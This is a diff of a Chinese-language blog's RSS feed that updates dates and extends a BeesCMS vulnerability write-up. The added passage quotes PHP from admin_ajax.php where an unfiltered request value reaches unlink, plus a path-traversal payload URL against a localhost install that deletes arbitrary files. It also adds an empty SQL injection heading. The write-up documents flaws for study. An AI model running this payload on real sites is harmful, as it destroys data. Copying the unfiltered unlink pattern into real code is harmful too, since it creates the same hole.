@@ -5,13 +5,13 @@
         <link>https://my011215.github.io</link>
         <description>用来记录学习和分享日常</description>
         <language>en</language>
-        <pubDate>Thu, 22 Dec 2022 22:15:30 +0800</pubDate>
-        <lastBuildDate>Thu, 22 Dec 2022 22:15:30 +0800</lastBuildDate>
+        <pubDate>Sat, 24 Dec 2022 17:15:30 +0800</pubDate>
+        <lastBuildDate>Sat, 24 Dec 2022 17:15:30 +0800</lastBuildDate>
         <item>
-            <guid isPermalink="true">https://my011215.github.io/2022/12/22/vulnerability/beescms/</guid>
+            <guid isPermalink="true">https://my011215.github.io/2022/12/24/vulnerability/beescms/</guid>
             <title>beescms</title>
-            <link>https://my011215.github.io/2022/12/22/vulnerability/beescms/</link>
-            <pubDate>Thu, 22 Dec 2022 22:15:30 +0800</pubDate>
+            <link>https://my011215.github.io/2022/12/24/vulnerability/beescms/</link>
+            <pubDate>Sat, 24 Dec 2022 17:15:30 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;参考：&lt;a href=&#34;https://xz.aliyun.com/t/11955&#34;&gt;https://xz.aliyun.com/t/11955&lt;/a&gt;&lt;/p&gt;
 &lt;!-- toc --&gt;
 &lt;ul&gt;
@@ -34,6 +34,8 @@
 &lt;li&gt;&lt;a href=&#34;#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87&#34;&gt;变量覆盖导致的后台登录绕过&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E&#34;&gt;任意文件删除漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E5%8F%82%E6%95%B0%E5%8F%AF%E6%8E%A7%E5%AF%BC%E8%87%B4%E7%9A%84sql%E6%B3%A8%E5%85%A5&#34;&gt;参数可控导致的 sql 注入&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- tocstop --&gt;
 &lt;h2&gt;&lt;span id=&#34;搭建&#34;&gt; 搭建&lt;/span&gt;&lt;/h2&gt;
@@ -188,6 +190,15 @@ mysql_fetch_assoc () — 从结果集中取得一行作为关联数&lt;br&gt;
 5. 传参&lt;br&gt;
  hackbar&lt;br&gt;
 &lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/206.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;span id=&#34;任意文件删除漏洞&#34;&gt; 任意文件删除漏洞&lt;/span&gt;&lt;/h2&gt;
+&lt;p&gt;admin/admin_ajax.php&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$value=$_REQUEST[&amp;#x27;value&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//删除图片&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elseif($action==&amp;#x27;del_pic&amp;#x27;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$file=CMS_PATH.&amp;#x27;upload/&amp;#x27;.$value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	@unlink($file);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	die(&amp;quot;图片成功删除&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;没有对 value 值进行严格过滤（或者说没有过滤），导致可以传任意值，我可以传入一些路径的文件进行删除，或者我可以删除站内文件。  …/ 文件&lt;br&gt;
+从 include 文件开始&lt;br&gt;
+登录后构造&lt;br&gt;
+ payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/beescms/admin/admin_ajax.php?action=del_pic&amp;amp;value=../文件名&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2&gt;&lt;span id=&#34;参数可控导致的-sql-注入&#34;&gt; 参数可控导致的 sql 注入&lt;/span&gt;&lt;/h2&gt;
  ]]></description>
         </item>
         <item>
